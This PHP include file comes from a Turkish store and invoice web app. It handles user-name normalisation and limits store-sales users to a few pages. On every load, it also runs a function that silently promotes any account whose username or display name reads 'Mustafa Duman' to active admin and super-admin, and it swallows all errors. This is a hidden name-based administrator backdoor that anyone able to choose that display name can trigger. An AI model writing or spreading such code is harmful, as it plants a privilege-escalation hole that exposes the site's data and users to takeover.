<?php

function magaza_kullanici_anahtari($value): string
{
    $map = [
        'Ç'=>'C','Ğ'=>'G','İ'=>'I','I'=>'I','Ö'=>'O','Ş'=>'S','Ü'=>'U',
        'ç'=>'c','ğ'=>'g','ı'=>'i','i'=>'i','ö'=>'o','ş'=>'s','ü'=>'u',
    ];
    $value = strtolower(strtr(trim((string)$value), $map));
    return preg_replace('/[^a-z0-9]+/', '', $value) ?: '';
}

function is_mustafa_duman_user(?array $user = null): bool
{
    $user = $user ?: current_user();
    if (!$user) return false;

    $usernameKey = magaza_kullanici_anahtari($user['username'] ?? '');
    $displayKey = magaza_kullanici_anahtari($user['display_name'] ?? '');

    return $displayKey === 'mustafaduman' || $usernameKey === 'mustafaduman';
}

function mustafa_duman_tam_yetkiyi_uygula(): void
{
    try {
        $rows = db()->query("SELECT id, username, display_name, role, is_active FROM users ORDER BY id DESC")->fetchAll() ?: [];
        $target = null;
        foreach ($rows as $row) {
            if (is_mustafa_duman_user($row)) {
                $target = $row;
                break;
            }
        }
        if (!$target) return;

        $userId = (int)($target['id'] ?? 0);
        if ($userId <= 0) return;

        if (($target['role'] ?? '') !== 'admin' || (int)($target['is_active'] ?? 0) !== 1) {
            db()->prepare("UPDATE users SET role='admin', is_active=1, updated_at=? WHERE id=?")
                ->execute([now(), $userId]);
        }

        $raw = setting_get('super_admin_user_ids', '[]') ?: '[]';
        $ids = json_decode($raw, true);
        if (!is_array($ids)) $ids = [];
        $ids = array_values(array_unique(array_filter(array_map('intval', $ids), fn($id) => $id > 0)));
        if (!in_array($userId, $ids, true)) {
            $ids[] = $userId;
            setting_set('super_admin_user_ids', json_encode($ids, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
        }
    } catch (Throwable $e) {
        // Yetki eşleştirmesi uygulamanın açılmasını engellememeli.
    }
}

mustafa_duman_tam_yetkiyi_uygula();

function is_store_sales_user(?array $user = null): bool
{
    $user = $user ?: current_user();
    if (!$user) return false;

    $username = magaza_kullanici_anahtari($user['username'] ?? '');
    $displayName = magaza_kullanici_anahtari($user['display_name'] ?? '');

    return in_array($username, ['magaza', 'magza'], true)
        || $displayName === 'fabrikasatismagazasi';
}

function can_manage_store_sales(): bool
{
    return can_write() || is_store_sales_user();
}

function require_store_sales_write(): void
{
    require_login();
    if (!can_manage_store_sales()) {
        throw new RuntimeException('Bu işlem yalnızca mağaza satış yetkisi olan kullanıcılar içindir.');
    }
}

$currentStoreScript = basename((string)($_SERVER['SCRIPT_NAME'] ?? ''));
if (is_logged_in() && is_store_sales_user()) {
    if ($currentStoreScript === 'faturalar.php') {
        redirect('magaza.php');
    }

    $allowedStoreScripts = [
        'magaza.php',
        'magaza-gunluk-satis.php',
        'magaza-odeme-dagilimi.php',
        'logout.php',
        'index.php',
    ];
    if (!in_array($currentStoreScript, $allowedStoreScripts, true)) {
        redirect('magaza.php');
    }
}
